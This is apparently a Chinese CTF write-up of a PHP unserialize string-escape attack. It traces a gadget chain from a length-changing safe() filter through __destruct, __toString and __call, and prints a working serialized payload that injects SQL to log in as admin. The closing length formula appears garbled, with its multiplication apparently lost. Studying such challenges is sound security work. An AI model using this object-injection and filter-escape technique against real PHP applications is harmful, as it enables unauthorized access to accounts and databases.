反序列化

www.zip源码，是反序列化，

分析

1.首先利用点在update.php文件里面，有个$user->update()的函数调用，然后进入lib.php文件。
2.下面为利用得到的部分代码，unserialize()反序列化了this->getNewinfo()，然后看这个方法。

public function update(){
        $Info=unserialize($this->getNewinfo());
        $age=$Info->age;
        $nickname=$Info->nickname;
        $updateAction=new UpdateHelper($_SESSION['id'],$Info,"update user SET age=$age,nickname=$nickname where id=".$_SESSION['id']);
        //这个功能还没有写完 先占坑
    }

3.下面是这个方法的内容，可以传入age与nickname，然后这里会对我们传入的值实例化一个Info对象，并进行safe()危险字符过滤，所以上面第二步反序列化的不是我们想要的，然后看safe()函数
public function getNewInfo(){
        $age=$_POST['age'];
        $nickname=$_POST['nickname'];
        return safe(serialize(new Info($age,$nickname)));
    }

4.下面是safe()函数内容，可以看到把没有6字符的单词都替换了，这里一般情况下可能是没有多大问题的，但是我们可以控制序列化的内容进而控制反序列化的内容，看UpdateHelper类
function safe($parm){
    $array= array('union','regexp','load','into','flag','file','insert',"'",'\\',"*","alter");
    return str_replace($array,'hacker',$parm);
}

5.有个析构方法的内容如下，这里如果sql实例化为一个对象就能调用__toString魔术方法了，这里因为User类里面有这个魔术方法，下面看User类里面的该魔术方法
public function __destruct()
    {
        echo $this->sql;
    }

6.toString魔术方法如下，调用nickname下属的方法，如果将nickname实例化为Info类的一个对象，因为没有update方法，触发Info类的call()方法，参数为$age
public function __toString()
    {
        $this->nickname->update($this->age);
        return "0-0";
    }

7.__call方法如下，$argument[0]是我们传入的$age参数，如CtrlCase实例化为dbCtrl类的一个对象，就会调用dbCtrl.login($sql)，这样的话$sql参数就能被控制了，就是传入的$age
public function __call($name,$argument){
        echo $this->CtrlCase->login($argument[0]);
    }

字符逃逸

如果直接传入正常参数的话，序列化之后是这样的

O:4:"Info":3:{s:3:"age";s:2:"18";s:8:"nickname";s:5:"loveu";s:8:"CtrlCase";N;}

这里可以构造
";s:8:"CtrlCase";O:12:"UpdateHelper":1:{s:3:"sql";O:4:"User":2:{s:3:"age";s:70:"select 1,"c4ca4238a0b923820dcc509a6f75849b" from user where username=?";s:8:"nickname";O:4:"Info":1:{s:8:"CtrlCase";O:6:"dbCtrl":2:{s:4:"name";s:5:"admin";s:8:"password";s:1:"1";}}}}}

最后多加上个}闭合，就会造成如下
O:4:"Info":3:{s:3:"age";s:2:"18";s:263:"";s:8:"CtrlCase";O:12:"UpdateHelper":1:{s:3:"sql";O:4:"User":2:{s:3:"age";s:70:"select 1,"c4ca4238a0b923820dcc509a6f75849b" from user where username=?";s:8:"nickname";O:4:"Info":1:{s:8:"CtrlCase";O:6:"dbCtrl":2:{s:4:"name";s:5:"admin";s:8:"password";s:1:"1";}}}}}


虽然那里是263，但是事实上里面没有长度，长度为零

字符逃逸原理
这时候如果我们把整个nickname的payload之前加上263个union，到时过safe()会自动变为hacker，长度增长了263位
用个公式总结吧就是

2635+263 = 2636 (2635表示union，+263表示我们需要塞进去的内容；后面的是hacker的2636<因为hacker是6个长，union是5个长>)
